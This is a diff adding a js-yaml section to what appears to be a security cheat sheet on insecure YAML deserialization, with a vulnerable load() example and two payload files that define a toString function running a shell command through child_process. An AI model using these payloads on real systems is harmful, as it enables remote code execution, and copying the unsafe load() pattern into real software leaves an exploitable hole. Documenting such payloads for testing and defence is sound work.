@@ -73,6 +73,37 @@ deserialized = load(open('data.yml'), Loader=Loader)
 ```
 {% endcode %}
 
+### JavaScript - `js-yaml` (<4.0)
+
+This popular JavaScript library allows the creation of arbitrary functions like `.toString()` which can be called accidentally, when using `load()` instead of `safeLoad()` in versions below 4:
+
+{% code title="Vulnerable Code" %}
+```javascript
+const yaml = require('js-yaml');
+const fs = require('fs');
+
+const res = yaml.load(fs.readFileSync('data.yml'));
+console.log(res + "")  // Calls .toString() as trigger
+```
+{% endcode %}
+
+#### Payloads
+
+{% code title="data.yml" %}
+```yaml
+"toString": !<tag:yaml.org,2002:js/function> "function (){console.log(process.mainModule.require('child_process').execSync('id').toString())}"
+```
+{% endcode %}
+
+{% code title="data.yml" %}
+```yaml
+toString: !!js/function >
+  function () {
+      console.log(process.mainModule.require('child_process').execSync('id').toString())
+  }
+```
+{% endcode %}
+
 ### Java - SnakeYAML (<2.0)
 
 {% embed url="https://www.mscharhag.com/security/snakeyaml-vulnerability-cve-2022-1471" %}
